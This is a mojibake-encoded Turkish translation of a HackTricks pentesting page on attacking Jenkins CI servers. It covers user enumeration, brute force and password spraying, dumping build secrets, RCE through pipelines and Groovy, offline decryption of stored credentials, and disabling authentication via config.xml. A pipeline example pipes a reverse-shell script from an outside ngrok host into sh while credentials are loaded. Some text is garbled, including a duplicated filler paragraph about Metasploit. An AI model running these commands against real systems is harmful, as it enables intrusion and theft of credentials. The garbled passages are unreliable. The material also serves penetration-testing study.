# Jenkins GÃ¼venliÄŸi

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahraman seviyesine Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ±zÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI'na**](https://github.com/sponsors/carlospolop) gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'Ä± takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>

## Temel Bilgiler

Jenkins, **herhangi bir** **programlama dili** ve kaynak kodu depolarÄ±nÄ± kullanarak **sÃ¼rekli entegrasyon** veya **sÃ¼rekli daÄŸÄ±tÄ±m** (CI/CD) ortamÄ± oluÅŸturmak iÃ§in basit bir yÃ¶ntem sunan bir araÃ§tÄ±r. AyrÄ±ca, Ã§eÅŸitli rutin geliÅŸtirme gÃ¶revlerini otomatikleÅŸtirir. Jenkins, **bireysel adÄ±mlar iÃ§in betik oluÅŸturma ihtiyacÄ±nÄ± ortadan kaldÄ±rmazken**, inÅŸa, test ve daÄŸÄ±tÄ±m araÃ§larÄ±nÄ±n tÃ¼m sÄ±ralamasÄ±nÄ± kolayca manuel olarak oluÅŸturulabilecek bir ÅŸekilde daha hÄ±zlÄ± ve saÄŸlam bir ÅŸekilde entegre etme imkanÄ± saÄŸlar.


{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

## Kimlik DoÄŸrulamasÄ±z SÄ±ralama

Kimlik doÄŸrulamasÄ±z (_/people_ veya _/asynchPeople_ gibi) ilginÃ§ Jenkins sayfalarÄ±nÄ± aramak iÃ§in mevcut kullanÄ±cÄ±larÄ± listelerken kullanabileceÄŸiniz:
```
msf> use auxiliary/scanner/http/jenkins_enum
```
KomutlarÄ± kimlik doÄŸrulamasÄ± olmadan Ã§alÄ±ÅŸtÄ±rÄ±p Ã§alÄ±ÅŸtÄ±ramadÄ±ÄŸÄ±nÄ±zÄ± kontrol edin:
```
msf> use auxiliary/scanner/http/jenkins_command
```
Kimlik bilgileri olmadan, _**/asynchPeople/**_ yoluna veya _**/securityRealm/user/admin/search/index?q=**_ yoluna bakarak **kullanÄ±cÄ± adlarÄ±nÄ±** bulabilirsiniz.

Jenkins sÃ¼rÃ¼mÃ¼nÃ¼ _**/oops**_ veya _**/error**_ yolundan alabilirsiniz.

![](<../../.gitbook/assets/image (48).png>)

### Bilinen ZayÄ±flÄ±klar

{% embed url="https://github.com/gquere/pwn_jenkins" %}

## GiriÅŸ

Temel bilgilerde Jenkins'e **giriÅŸ yapmanÄ±n tÃ¼m yollarÄ±nÄ±** kontrol edebilirsiniz:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### KayÄ±t Ol

Jenkins Ã¶rneklerini bulabilirsiniz ki bu size bir hesap oluÅŸturmanÄ±za ve iÃ§ine giriÅŸ yapmanÄ±za izin verir. Bu kadar basit.

### **SSO GiriÅŸi**

AyrÄ±ca, **SSO iÅŸlevselliÄŸi/pluginleri** mevcutsa, bir test hesabÄ± kullanarak (Ã¶rneÄŸin, bir test **Github/Bitbucket hesabÄ±**) uygulamaya **giriÅŸ yapmayÄ±** denemelisiniz. Ä°pucu [**buradan**](https://emtunc.org/blog/01/2018/research-misconfigured-jenkins-servers/).

### Brute Force

**Jenkins**, **ÅŸifre politikasÄ±** ve **kullanÄ±cÄ± adÄ± brute force Ã¶nlemi** eksikliÄŸi gÃ¶sterir. ZayÄ±f ÅŸifrelerin veya kullanÄ±cÄ± adlarÄ±nÄ±n ÅŸifre olarak kullanÄ±labileceÄŸi, hatta **tersine Ã§evrilmiÅŸ kullanÄ±cÄ± adlarÄ±nÄ±n ÅŸifre olarak kullanÄ±labileceÄŸi** durumlar olabilir.
```
msf> use auxiliary/scanner/http/jenkins_login
```
### Parola sÄ±Ã§ratma

[Åu python scriptini](https://github.com/gquere/pwn_jenkins/blob/master/password_spraying/jenkins_password_spraying.py) veya [ÅŸu powershell scriptini](https://github.com/chryzsh/JenkinsPasswordSpray) kullanÄ±n.

### IP Beyaz Listesi Atlama

BirÃ§ok kuruluÅŸ, GitHub veya GitLab gibi **SaaS tabanlÄ± kaynak kontrol yÃ¶netimi (SCM) sistemlerini** Jenkins veya TeamCity gibi **iÃ§, kendi barÄ±ndÄ±ran CI** Ã§Ã¶zÃ¼mleriyle birleÅŸtirir. Bu yapÄ±landÄ±rma, CI sistemlerinin Ã¶ncelikle boru hattÄ± iÅŸlerini tetiklemek iÃ§in SaaS kaynak kontrol satÄ±cÄ±larÄ±ndan webhook etkinlikleri almasÄ±na olanak tanÄ±r.

Bunu baÅŸarmak iÃ§in, kuruluÅŸlar **SCM platformlarÄ±nÄ±n IP aralÄ±klarÄ±nÄ± beyaz listeye** alÄ±r ve bunlarÄ±n **webhooklar** aracÄ±lÄ±ÄŸÄ±yla **iÃ§ CI sistemine** eriÅŸmelerine izin verir. Ancak, GitHub veya GitLab'da herhangi biri bir **hesap oluÅŸturabilir** ve bunu **webhook tetiklemek** iÃ§in yapÄ±landÄ±rabilir, potansiyel olarak **iÃ§ CI sistemine** istekler gÃ¶nderebilir.

Kontrol et:
[shttps://www.cidersecurity.io/blog/research/how-we-abused-repository-webhooks-to-access-internal-ci-systems-at-scale/](https://www.cidersecurity.io/blog/research/how-we-abused-repository-webhooks-to-access-internal-ci-systems-at-scale/)

## Ä°Ã§ Jenkins Ä°stismarlarÄ±

Bu senaryolarda, Jenkins'e eriÅŸmek iÃ§in geÃ§erli bir hesabÄ±nÄ±z olduÄŸunu varsayacaÄŸÄ±z.

{% hint style="warning" %}
Jenkins'te yapÄ±landÄ±rÄ±lan **Yetkilendirme** mekanizmasÄ±na ve etkilenen kullanÄ±cÄ±nÄ±n izinlerine baÄŸlÄ± olarak, aÅŸaÄŸÄ±daki saldÄ±rÄ±larÄ± gerÃ§ekleÅŸtirebilir veya gerÃ§ekleÅŸtiremeyebilirsiniz.
{% endhint %}

Daha fazla bilgi iÃ§in temel bilgilere bakÄ±n:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### KullanÄ±cÄ±larÄ± listeleme

Jenkins'e eriÅŸtiyseniz, diÄŸer kayÄ±tlÄ± kullanÄ±cÄ±larÄ± [http://127.0.0.1:8080/asynchPeople/](http://127.0.0.1:8080/asynchPeople/) adresinde listeleyebilirsiniz.

### AÃ§Ä±k metin sÄ±rlarÄ± bulmak iÃ§in yapÄ±larÄ±n dÃ¶kÃ¼lmesi

UmarÄ±z aÃ§Ä±k metin sÄ±rlarÄ±nÄ± bulmak iÃ§in [bu scripti](https://github.com/gquere/pwn_jenkins/blob/master/dump_builds/jenkins_dump_builds.py) kullanarak yapÄ± konsol Ã§Ä±ktÄ±larÄ±nÄ± ve yapÄ± ortam deÄŸiÅŸkenlerini dÃ¶kebilirsiniz.
```bash
python3 jenkins_dump_builds.py -u alice -p alice http://127.0.0.1:8080/ -o build_dumps
cd build_dumps
gitleaks detect --no-git -v
```
### **SSH Kimlik Bilgilerini Ã‡alma**

EÄŸer kompromize edilen kullanÄ±cÄ±nÄ±n **yeni bir Jenkins dÃ¼ÄŸÃ¼mÃ¼ oluÅŸturma/deÄŸiÅŸtirme yetkisi** varsa ve zaten diÄŸer dÃ¼ÄŸÃ¼mlere eriÅŸmek iÃ§in SSH kimlik bilgileri saklanÄ±yorsa, kimlik bilgilerini **kimlik doÄŸrulamasÄ± yapmadan kaydedecek bir ana bilgisayar ayarlayarak** bu kimlik bilgilerini Ã§alabilir:

![](<../../.gitbook/assets/image (56).png>)

Jenkins ssh kimlik bilgilerini genellikle bir **genel saÄŸlayÄ±cÄ±da** (`/credentials/`) bulabilirsiniz, bu yÃ¼zden bunlarÄ± diÄŸer sÄ±rlarÄ± nasÄ±l sÄ±zdÄ±rdÄ±ÄŸÄ±nÄ±z gibi sÄ±zdÄ±rabilirsiniz. Daha fazla bilgi iÃ§in [**SÄ±rlarÄ± SÄ±zdÄ±rma bÃ¶lÃ¼mÃ¼ne**](./#dumping-secrets) bakÄ±n.

### **Jenkins'te RCE (Uzaktan Kod Ã‡alÄ±ÅŸtÄ±rma)**

Jenkins sunucusunda bir **kabuk elde etmek**, saldÄ±rganÄ±n tÃ¼m **sÄ±rlarÄ±** ve **ortam deÄŸiÅŸkenlerini sÄ±zdÄ±rmasÄ±na** ve aynÄ± aÄŸda bulunan diÄŸer makineleri hatta **bulut kimlik bilgilerini toplamasÄ±na** olanak tanÄ±r.

Jenkins varsayÄ±lan olarak **SÄ°STEM olarak Ã§alÄ±ÅŸÄ±r**. Bu nedenle, bunu ele geÃ§irmek saldÄ±rgana **SÄ°STEM ayrÄ±calÄ±klarÄ±** saÄŸlar.

### **Proje OluÅŸturma/DeÄŸiÅŸtirme ile RCE**

Bir proje oluÅŸturmak/deÄŸiÅŸtirmek, Jenkins sunucusu Ã¼zerinde RCE elde etmenin bir yoludur:

{% content-ref url="jenkins-rce-creating-modifying-project.md" %}
[jenkins-rce-creating-modifying-project.md](jenkins-rce-creating-modifying-project.md)
{% endcontent-ref %}

### **Groovy Betik Ã‡alÄ±ÅŸtÄ±rarak RCE Elde Etme**

Yeni bir proje oluÅŸturmak yerine daha gizli bir ÅŸekilde RCE elde etmek iÃ§in bir Groovy betik Ã§alÄ±ÅŸtÄ±rabilirsiniz:

{% content-ref url="jenkins-rce-with-groovy-script.md" %}
[jenkins-rce-with-groovy-script.md](jenkins-rce-with-groovy-script.md)
{% endcontent-ref %}

### Pipeline OluÅŸturma/DeÄŸiÅŸtirme ile RCE

**Pipeline oluÅŸturarak/deÄŸiÅŸtirerek** de **RCE elde edebilirsiniz**:

{% content-ref url="jenkins-rce-creating-modifying-pipeline.md" %}
[jenkins-rce-creating-modifying-pipeline.md](jenkins-rce-creating-modifying-pipeline.md)
{% endcontent-ref %}

## Pipeline SÃ¶mÃ¼rÃ¼sÃ¼

Pipeline'larÄ± sÃ¶mÃ¼rmek iÃ§in hala Jenkins'a eriÅŸiminiz olmasÄ± gerekmektedir.

### Build Pipeline'larÄ±

**Pipeline'lar**, projelerde **derleme mekanizmasÄ± olarak da kullanÄ±labilir**, bu durumda pipeline sÃ¶zdizimini iÃ§eren bir **dizin iÃ§indeki bir dosya** yapÄ±landÄ±rÄ±labilir. VarsayÄ±lan olarak `/Jenkinsfile` kullanÄ±lÄ±r:

![](<../../.gitbook/assets/image (14) (1) (1).png>)

Pipeline yapÄ±landÄ±rma dosyalarÄ±nÄ± **baÅŸka yerlerde** (Ã¶rneÄŸin baÅŸka depolarda) **saklamak** da mÃ¼mkÃ¼ndÃ¼r, bu ÅŸekilde depo eriÅŸimi ve pipeline eriÅŸimi **ayrÄ±labilir**.

Bir saldÄ±rganÄ±n **bu dosyaya yazma eriÅŸimi** varsa, dosyayÄ± **deÄŸiÅŸtirebilir** ve Jenkins'e eriÅŸimi olmadan bile pipeline'Ä± **tetikleyebilir**.\
SaldÄ±rganÄ±n bazÄ± dal korumalarÄ±nÄ± **atlamasÄ± gerekebilir** (platforma ve kullanÄ±cÄ± ayrÄ±calÄ±klarÄ±na baÄŸlÄ± olarak atlanabilir veya atlanamaz).

Ã–zel bir pipeline'Ä± Ã§alÄ±ÅŸtÄ±rmak iÃ§in en yaygÄ±n tetikleyiciler ÅŸunlardÄ±r:

* Ana dal iÃ§in **Ã§ekme isteÄŸi** (veya potansiyel olarak diÄŸer dallar iÃ§in)
* Ana dala **itme** (veya potansiyel olarak diÄŸer dallar iÃ§in)
* Ana dalÄ± **gÃ¼ncelle** ve bir ÅŸekilde yÃ¼rÃ¼tÃ¼lmesini bekleyin

{% hint style="info" %}
EÄŸer bir **harici kullanÄ±cÄ±** iseniz, **baÅŸka bir kullanÄ±cÄ±nÄ±n/ÅŸirketin** deposunun **ana dalÄ±na PR oluÅŸturup** pipeline'Ä± **tetiklemeyi beklememelisiniz**... ancak **kÃ¶tÃ¼ yapÄ±landÄ±rÄ±lmÄ±ÅŸ** ise bunu kullanarak ÅŸirketleri tamamen **ele geÃ§irebilirsiniz**.
{% endhint %}

### Pipeline RCE

Ã–nceki RCE bÃ¶lÃ¼mÃ¼nde, bir pipeline'Ä± **deÄŸiÅŸtirerek RCE elde etme** tekniÄŸi zaten belirtilmiÅŸtir.

### Ortam DeÄŸiÅŸkenlerini Kontrol Etme

TÃ¼m pipeline veya belirli aÅŸamalar iÃ§in **aÃ§Ä±k metin ortam deÄŸiÅŸkenleri** bildirilebilir. Bu ortam deÄŸiÅŸkenleri **hassas bilgiler iÃ§ermemelidir**, ancak bir saldÄ±rgan her zaman **tÃ¼m pipeline** yapÄ±landÄ±rmalarÄ±nÄ±/Jenkins dosyalarÄ±nÄ± kontrol edebilir:
```bash
pipeline {
agent {label 'built-in'}
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
```
### SÄ±zdÄ±rma SÄ±rlarÄ±

Jenkins tarafÄ±ndan sÄ±rlarÄ±n nasÄ±l iÅŸlendiÄŸi hakkÄ±nda bilgi iÃ§in temel bilgilere gÃ¶z atÄ±n:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

Kimlik bilgileri genel saÄŸlayÄ±cÄ±lara (`/credentials/`) veya belirli projelere (`/job/<proje-adÄ±>/configure`) **kapsamlÄ±** olabilir. Bu nedenle, tÃ¼m sÄ±rlarÄ± ele geÃ§irmek iÃ§in en azÄ±ndan sÄ±rlar iÃ§eren tÃ¼m projeleri **etkisiz hale getirmeniz** ve Ã¶zel/poisoned pipeline'larÄ± Ã§alÄ±ÅŸtÄ±rmanÄ±z gerekmektedir.

BaÅŸka bir sorun daha var, bir pipeline'Ä±n env'sindeki bir **sÄ±rrÄ± almak iÃ§in sÄ±rrÄ±n adÄ±nÄ± ve tÃ¼rÃ¼nÃ¼ bilmelisiniz**. Ã–rneÄŸin, bir **`usernamePassword`** **sÄ±rrÄ±nÄ±** bir **`string`** **sÄ±rrÄ±** olarak **yÃ¼klemeye** Ã§alÄ±ÅŸÄ±rsanÄ±z, bu **hata**yÄ± alÄ±rsÄ±nÄ±z:
```
ERROR: Credentials 'flag2' is of type 'Username with password' where 'org.jenkinsci.plugins.plaincredentials.StringCredentials' was expected
```
Ä°ÅŸte bazÄ± yaygÄ±n gizli tÃ¼rlerini yÃ¼klemenin yolu:
```bash
withCredentials([usernamePassword(credentialsId: 'flag2', usernameVariable: 'USERNAME', passwordVariable: 'PASS')]) {
sh '''
env #Search for USERNAME and PASS
'''
}

withCredentials([string(credentialsId: 'flag1', variable: 'SECRET')]) {
sh '''
env #Search for SECRET
'''
}

withCredentials([usernameColonPassword(credentialsId: 'mylogin', variable: 'USERPASS')]) {
sh '''
env # Search for USERPASS
'''
}

# You can also load multiple env variables at once
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
env
'''
}
```
Bu sayfanÄ±n sonunda **tÃ¼m kimlik bilgisi tÃ¼rlerini bulabilirsiniz**: [https://www.jenkins.io/doc/pipeline/steps/credentials-binding/](https://www.jenkins.io/doc/pipeline/steps/credentials-binding/)

{% hint style="warning" %}
TÃ¼m sÄ±rlarÄ± **aynÄ± anda sÄ±zdÄ±rmak** iÃ§in en iyi yol, **Jenkins** makinesini **kompromize etmek** (Ã¶rneÄŸin, yerleÅŸik dÃ¼ÄŸÃ¼mde ters kabuk Ã§alÄ±ÅŸtÄ±rmak) ve ardÄ±ndan **anahtarlarÄ± sÄ±zdÄ±rmak** ve **ÅŸifreli sÄ±rlarÄ±** Ã§evrimdÄ±ÅŸÄ± olarak Ã§Ã¶zmektir.\
Bunu nasÄ±l yapacaÄŸÄ±nÄ±z hakkÄ±nda daha fazla bilgiyi [DÃ¼ÄŸÃ¼mler ve Ajanlar bÃ¶lÃ¼mÃ¼nde](./#nodes-and-agents) ve [SaldÄ±rÄ± SonrasÄ± bÃ¶lÃ¼mÃ¼nde](./#post-exploitation) bulabilirsiniz.
{% endhint %}

### Tetikleyiciler

[Belgelerden](https://www.jenkins.io/doc/book/pipeline/syntax/#triggers): `triggers` yÃ¶nergesi, Pipeline'Ä±n nasÄ±l otomatik olarak yeniden tetikleneceÄŸini tanÄ±mlar. GitHub veya BitBucket gibi bir kaynakla entegre olan Pipeline'lar iÃ§in, `triggers` olmasÄ± gerekli olmayabilir, Ã§Ã¼nkÃ¼ webhook tabanlÄ± entegrasyon zaten mevcut olabilir. Åu anda mevcut olan tetikleyiciler `cron`, `pollSCM` ve `upstream`'dir.

Cron Ã¶rneÄŸi:
```bash
triggers { cron('H */4 * * 1-5') }
```
**DiÄŸer Ã¶rnekler iÃ§in belgelere bakÄ±n**.

### DÃ¼ÄŸÃ¼mler ve Ajanlar

Bir **Jenkins Ã¶rneÄŸi**, **farklÄ± makinelerde Ã§alÄ±ÅŸan farklÄ± ajanlara** sahip olabilir. Bir saldÄ±rganÄ±n bakÄ±ÅŸ aÃ§Ä±sÄ±ndan, farklÄ± makinelerin eriÅŸimi, Ã§alÄ±nabilecek **farklÄ± potansiyel bulut kimlik bilgileri** veya diÄŸer makineleri sÃ¶mÃ¼rmek iÃ§in kÃ¶tÃ¼ye kullanÄ±labilecek **farklÄ± aÄŸ eriÅŸimi** anlamÄ±na gelir.

Daha fazla bilgi iÃ§in temel bilgilere bakÄ±n:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

`/computer/` dizininde **yapÄ±landÄ±rÄ±lmÄ±ÅŸ dÃ¼ÄŸÃ¼mleri** numaralandÄ±rabilirsiniz, genellikle \*\*`YerleÅŸik DÃ¼ÄŸÃ¼m` \*\* (Jenkins'i Ã§alÄ±ÅŸtÄ±ran dÃ¼ÄŸÃ¼m) ve potansiyel olarak daha fazlasÄ±nÄ± bulabilirsiniz:

![](<../../.gitbook/assets/image (25).png>)

**YerleÅŸik dÃ¼ÄŸÃ¼mÃ¼** ele geÃ§irmek Ã¶zellikle ilginÃ§tir Ã§Ã¼nkÃ¼ hassas Jenkins bilgilerini iÃ§erir.

**YapÄ±yÄ±** **yerleÅŸik Jenkins dÃ¼ÄŸÃ¼mÃ¼nde Ã§alÄ±ÅŸtÄ±rmak** iÃ§in, yapÄ± iÃ§inde aÅŸaÄŸÄ±daki yapÄ±landÄ±rmayÄ± belirtebilirsiniz:
```bash
pipeline {
agent {label 'built-in'}
```
### Tam Ã¶rnek

Belirli bir ajan iÃ§eren bir boru hattÄ±, bir cron tetikleyici ile, boru hattÄ± ve aÅŸama ortam deÄŸiÅŸkenleriyle, bir adÄ±mda 2 deÄŸiÅŸken yÃ¼kleyen ve ters kabuk gÃ¶nderen bir Ã¶rnektir:
```bash
pipeline {
agent {label 'built-in'}
triggers { cron('H */4 * * 1-5') }
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
curl https://reverse-shell.sh/0.tcp.ngrok.io:16287 | sh PASS
'''
}
}
}

post {
always {
cleanWs()
}
}
}
```
Metasploit, birÃ§ok farklÄ± saldÄ±rÄ± vektÃ¶rÃ¼ ve hedef sistemler Ã¼zerinde kullanÄ±labilen bir aÃ§Ä±k kaynaklÄ± saldÄ±rÄ± Ã§erÃ§evesidir. Metasploit, saldÄ±rganlarÄ±n hedef sistemlere eriÅŸim saÄŸlamasÄ±na ve ardÄ±ndan bu sistemleri istedikleri gibi kontrol etmelerine olanak tanÄ±r. Bu, saldÄ±rganlarÄ±n hedef sistemdeki verilere eriÅŸebilmesi, sistem ayarlarÄ±nÄ± deÄŸiÅŸtirebilmesi veya hedef sistem Ã¼zerinde istedikleri komutlarÄ± Ã§alÄ±ÅŸtÄ±rabilmesi anlamÄ±na gelir.

Metasploit, birÃ§ok farklÄ± saldÄ±rÄ± modÃ¼lÃ¼ iÃ§erir ve bu modÃ¼ller, saldÄ±rganlarÄ±n hedef sistemler Ã¼zerinde Ã§eÅŸitli saldÄ±rÄ±lar gerÃ§ekleÅŸtirmesine yardÄ±mcÄ± olur. Bu saldÄ±rÄ±lar arasÄ±nda exploitler, payloadlar, post-exploitasyon araÃ§larÄ± ve daha fazlasÄ± bulunur.

Metasploit, saldÄ±rganlarÄ±n hedef sistemler Ã¼zerindeki zayÄ±flÄ±klarÄ± tespit etmelerine ve bu zayÄ±flÄ±klarÄ± kullanarak sistemlere eriÅŸim saÄŸlamalarÄ±na yardÄ±mcÄ± olur. Bu nedenle, bir saldÄ±rganÄ±n hedef sistem Ã¼zerindeki zayÄ±flÄ±klarÄ± tespit etmek ve istismar etmek iÃ§in Metasploit'i kullanmasÄ± yaygÄ±n bir yÃ¶ntemdir.

Metasploit, saldÄ±rganlarÄ±n hedef sistemler Ã¼zerindeki zayÄ±flÄ±klarÄ± tespit etmelerine ve bu zayÄ±flÄ±klarÄ± kullanarak sistemlere eriÅŸim saÄŸlamalarÄ±na yardÄ±mcÄ± olur. Bu nedenle, bir saldÄ±rganÄ±n hedef sistem Ã¼zerindeki zayÄ±flÄ±klarÄ± tespit etmek ve istismar etmek iÃ§in Metasploit'i kullanmasÄ± yaygÄ±n bir yÃ¶ntemdir.
```
msf> post/multi/gather/jenkins_gather
```
### Jenkins SÄ±rlarÄ±

Yeterli izinlere sahipseniz, `/credentials/` eriÅŸerek sÄ±rlarÄ± listeleyebilirsiniz. Bu, yalnÄ±zca `credentials.xml` dosyasÄ± iÃ§indeki sÄ±rlarÄ± listeleyecektir, ancak **derleme yapÄ±landÄ±rma dosyalarÄ±nda** daha fazla kimlik bilgisi olabilir.

Her projenin yapÄ±landÄ±rmasÄ±nÄ± **gÃ¶rebiliyorsanÄ±z**, orada da **depo eriÅŸimi iÃ§in kullanÄ±lan kimlik bilgilerinin (sÄ±rlarÄ±n) adlarÄ±nÄ±** ve **projenin diÄŸer kimlik bilgilerini** gÃ¶rebilirsiniz.

![](<../../.gitbook/assets/image (9) (1) (1) (1) (1).png>)

#### Groovy'den

{% content-ref url="jenkins-dumping-secrets-from-groovy.md" %}
[jenkins-dumping-secrets-from-groovy.md](jenkins-dumping-secrets-from-groovy.md)
{% endcontent-ref %}

#### Diskten

Jenkins sÄ±rlarÄ±nÄ± **ÅŸifrelemek iÃ§in** bu dosyalara ihtiyaÃ§ vardÄ±r:

* secrets/master.key
* secrets/hudson.util.Secret

Bu tÃ¼r **sÄ±rlar genellikle ÅŸurada bulunabilir**:

* credentials.xml
* jobs/.../build.xml
* jobs/.../config.xml

Ä°ÅŸte onlarÄ± bulmak iÃ§in bir regex:
```bash
# Find the secrets
grep -re "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"
# Print only the filenames where the secrets are located
grep -lre "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"

# Secret example
credentials.xml: <secret>{AQAAABAAAAAwsSbQDNcKIRQMjEMYYJeSIxi2d3MHmsfW3d1Y52KMOmZ9tLYyOzTSvNoTXdvHpx/kkEbRZS9OYoqzGsIFXtg7cw==}</secret>
```
#### Jenkins ÅŸifrelerini Ã§evrimdÄ±ÅŸÄ± olarak ÅŸifre Ã§Ã¶zme

EÄŸer **ÅŸifreleri Ã§Ã¶zmek iÃ§in gerekli olan ÅŸifreleri** dÃ¶kmÃ¼ÅŸseniz, [**bu betiÄŸi**](https://github.com/gquere/pwn\_jenkins/blob/master/offline\_decryption/jenkins\_offline\_decrypt.py) kullanarak bu ÅŸifreleri Ã§Ã¶zebilirsiniz.
```bash
python3 jenkins_offline_decrypt.py master.key hudson.util.Secret cred.xml
06165DF2-C047-4402-8CAB-1C8EC526C115
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAt985Hbb8KfIImS6dZlVG6swiotCiIlg/P7aME9PvZNUgg2Iyf2FT
```
#### Groovy ile Jenkins sÄ±rlarÄ±nÄ± ÅŸifre Ã§Ã¶zme

Jenkins, yapÄ±landÄ±rma dosyalarÄ±nda kullanÄ±lan ÅŸifreleri ÅŸifrelemek iÃ§in bir mekanizma saÄŸlar. Bu ÅŸifreler, Jenkins sunucusunda depolanÄ±r ve Jenkins tarafÄ±ndan kullanÄ±ldÄ±ÄŸÄ±nda otomatik olarak Ã§Ã¶zÃ¼lÃ¼r. Ancak, bazen bu ÅŸifreleri Jenkins sunucusu dÄ±ÅŸÄ±nda kullanmanÄ±z gerekebilir. Bu durumda, ÅŸifreleri Groovy betikleri kullanarak Ã§Ã¶zebilirsiniz.

AÅŸaÄŸÄ±daki Groovy kodu, Jenkins ÅŸifrelerini Ã§Ã¶zmek iÃ§in kullanÄ±labilir:

```groovy
import hudson.util.Secret

def secret = Secret.decrypt("<encrypted_secret>")
def plainText = secret.getPlainText()
println plainText
```

YukarÄ±daki kodu kullanarak, `<encrypted_secret>` yerine ÅŸifrelenmiÅŸ bir Jenkins sÄ±rrÄ±nÄ± geÃ§erek, bu sÄ±rrÄ±n Ã§Ã¶zÃ¼lmÃ¼ÅŸ halini elde edebilirsiniz. Ã‡Ã¶zÃ¼lmÃ¼ÅŸ sÄ±r, `plainText` deÄŸiÅŸkeninde depolanÄ±r ve `println` ifadesiyle ekrana yazdÄ±rÄ±lÄ±r.

Bu yÃ¶ntem, Jenkins yapÄ±landÄ±rma dosyalarÄ±nda kullanÄ±lan ÅŸifreleri Ã§Ã¶zmek iÃ§in kullanÄ±ÅŸlÄ± bir araÃ§tÄ±r. Ancak, bu kodu dikkatlice kullanmalÄ± ve ÅŸifreleri gÃ¼venli bir ÅŸekilde saklamalÄ±sÄ±nÄ±z.
```bash
println(hudson.util.Secret.decrypt("{...}"))
```
### Yeni yÃ¶netici kullanÄ±cÄ±sÄ± oluÅŸturma

1. `/var/lib/jenkins/config.xml` veya `C:\Program Files (x86)\Jenkis\` dizinindeki Jenkins config.xml dosyasÄ±na eriÅŸin.
2. `<useSecurity>true</useSecurity>` kelimesini arayÄ±n ve \*\*`true` \*\* kelimesini **`false`** olarak deÄŸiÅŸtirin.
1. `sed -i -e 's/<useSecurity>true</<useSecurity>false</g' config.xml` komutunu Ã§alÄ±ÅŸtÄ±rÄ±n.
3. **Jenkins** sunucusunu **yeniden baÅŸlatÄ±n**: `service jenkins restart`
4. Åimdi tekrar Jenkins portalÄ±na gidin ve bu sefer Jenkins herhangi bir kimlik bilgisi sormayacaktÄ±r. YÃ¶netici ÅŸifresini yeniden ayarlamak iÃ§in "**Manage Jenkins**" bÃ¶lÃ¼mÃ¼ne gidin.
5. AyarlarÄ± `<useSecurity>true</useSecurity>` olarak deÄŸiÅŸtirin ve Jenkins'i tekrar **yeniden baÅŸlatÄ±n**.

## Referanslar

* [https://github.com/gquere/pwn\_jenkins](https://github.com/gquere/pwn\_jenkins)
* [https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/](https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/)
* [https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password](https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password)
* [https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html](https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html)
* [https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072](https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072)
* [https://medium.com/@Proclus/tryhackme-internal-walk-through-90ec901926d3](https://medium.com/@Proclus/tryhackme-internal-walk-through-90ec901926d3)

<details>

<summary><strong>AWS hackleme konusunda sÄ±fÄ±rdan kahraman olmak iÃ§in</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>'Ä± Ã¶ÄŸrenin!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ±zÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
